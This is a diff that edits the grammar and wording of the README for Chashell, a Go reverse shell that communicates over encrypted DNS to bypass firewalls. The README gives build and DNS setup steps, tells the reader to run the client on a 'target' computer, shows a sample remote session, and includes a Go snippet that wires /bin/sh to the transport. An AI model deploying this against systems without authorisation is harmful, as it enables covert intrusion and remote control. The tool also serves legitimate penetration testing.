@@ -2,33 +2,33 @@
 
 ## Reverse Shell over DNS
 
-Chashell is a [Go](https://golang.org/) reverse shell that communicate using DNS. 
-It can be used to bypass firewall or heavy restricted networks.
+Chashell is a [Go](https://golang.org/) reverse shell that communicates over DNS. 
+It can be used to bypass firewalls or tightly restricted networks.
 
-It comes with a multi-client control server named *chaserv*.
+It comes with a multi-client control server, named *chaserv*.
 
 ![Chaserv](img/chaserv.gif)
 
 ### Communication security
 
-Every packets are encrypted using symetric cryptography ([XSalsa20](https://en.wikipedia.org/wiki/Salsa20) + [Poly1305](https://en.wikipedia.org/wiki/Poly1305)) with a shared key between the client
+Every packet is encrypted using symmetric cryptography ([XSalsa20](https://en.wikipedia.org/wiki/Salsa20) + [Poly1305](https://en.wikipedia.org/wiki/Poly1305)), with a shared key between the client
 and the server.
 
-Asymmetric cryptography is **planned**.
+We plan to implement asymmetric cryptography in the future.
 
 ### Protocol
 
-Chashell communicate using [Protocol Buffers](https://developers.google.com/protocol-buffers/) serialized messages. The Protocol Buffers message format (.proto file) is available in the **proto** folder.
+Chashell communicates using [Protocol Buffers](https://developers.google.com/protocol-buffers/) serialized messages. The `.proto` file is available in the `proto` folder.
 
 Here is a (simplified) communication chart :
 
 ![Protocol](img/proto.png)
 
-Keep in mind that every packets are encrypted, hex-encoded and then packed for DNS.
+Keep in mind that every packet is encrypted, hex-encoded and then packed for DNS transportation.
 
 ### Supported systems
 
-All desktop systems (Windows, Linux, Darwin, BSD variants) supported by the Go compiler should work.
+Chashell should work with any desktop system (Windows, Linux, Darwin, BSD variants) that is supported by the Go compiler.
 
 We tested those systems and it works without issues :
 
@@ -40,7 +40,7 @@ We tested those systems and it works without issues :
 
 #### Building
 
-Build all the binaries (change the domain_name and the encryption_key) :
+Build all the binaries (adjust the domain_name and the encryption_key to your needs):
 
 
 ```
@@ -49,19 +49,19 @@ $ export DOMAIN_NAME=c.sysdream.com
 $ make build-all
 ```
 
-Building for a specific platform :
+Build for a specific platform:
 
 ```
 $ make build-all OSARCH="linux/arm"
 ```
 
-Building the server only :
+Build only the server:
 
 ```
 $ make build-server
 ```
 
-Building the client (chashell) only :
+Build only the client (*chashell* itself):
 
 ```
 $ make build-client
@@ -69,7 +69,7 @@ $ make build-client
 
 #### DNS Settings
 
-* Buy/use a domain name of your choice (small if possible).
+* Buy and configure a domain name of your choice (preferably short).
 * Set a DNS record like this : 
 
 ```
@@ -77,10 +77,16 @@ chashell 300 IN A [SERVERIP]
 c 300 IN NS chashell.[DOMAIN].
 ```
 
-* Run chaserv on the control server.
-* Run chashell on the target computer.
+#### Usage
 
-The client should now appear on chaserv :
+Basically, on the server side (attacker's computer), you must use the `chaserv` binary. For the client side (i.e the target), use the `chashell` binary.
+
+So:
+
+* Run `chaserv` on the control server.
+* Run `chashell` on the target computer.
+
+The client should now connect back to `chaserv`:
 
 ```
 [n.chatelain]$ sudo ./chaserv
@@ -97,12 +103,9 @@ usr
 var
 ```
 
-On the server, use the chaserv binary.
-For the client (or the target), use the chashell binary.
-
 ## Implement your own
 
-The *chashell/lib/transport* is compatible with the *io.Reader* / *io.Writer* interface. So, implementing a reverse shell is easy as :
+The *chashell/lib/transport* library is compatible with the *io.Reader* / *io.Writer* interface. So, implementing a reverse shell is as easy as :
 
 ```go
 cmd := exec.Command("/bin/sh")
@@ -117,8 +120,7 @@ cmd.Run()
 
 ## To Do
 
-* Implement asymmetric cryptography ([Curve25519](https://en.wikipedia.org/wiki/Curve25519), [XSalsa20](https://en.wikipedia.org/wiki/Salsa20) and [Poly1305](https://en.wikipedia.org/wiki/Poly1305)).
-* Retrieve the hostname using the InfoPacket message.
-* Create a "proxy/relay" tool in order to tunnel TCP/UDP streams (Meterpreter over DNS !).
-* Protection against denial of service attacks.
-* Use less dependencies.
+* Implement asymmetric cryptography ([Curve25519](https://en.wikipedia.org/wiki/Curve25519), [XSalsa20](https://en.wikipedia.org/wiki/Salsa20) and [Poly1305](https://en.wikipedia.org/wiki/Poly1305))
+* Retrieve the host name using the `InfoPacket` message.
+* Create a *proxy/relay* tool in order to tunnel TCP/UDP streams. (Meterpreter over DNS !)
+
